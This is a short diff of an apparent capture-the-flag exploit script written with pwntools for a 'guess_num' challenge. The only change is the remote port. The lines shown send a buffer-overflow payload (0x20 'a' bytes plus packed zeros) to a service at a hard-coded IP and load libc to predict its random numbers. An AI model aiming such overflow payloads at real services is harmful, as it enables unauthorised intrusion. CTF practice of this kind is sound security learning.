@@ -2,7 +2,7 @@ from pwn import *
 from ctypes import cdll
 
 # p = process("./guess_num")
-p = remote("111.198.29.45" , 30297)
+p = remote("111.198.29.45" , 30880)
 p.sendlineafter("Your name:" , "a" * 0x20 + p32(0) * 2)
 
 libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc-2.23.so")
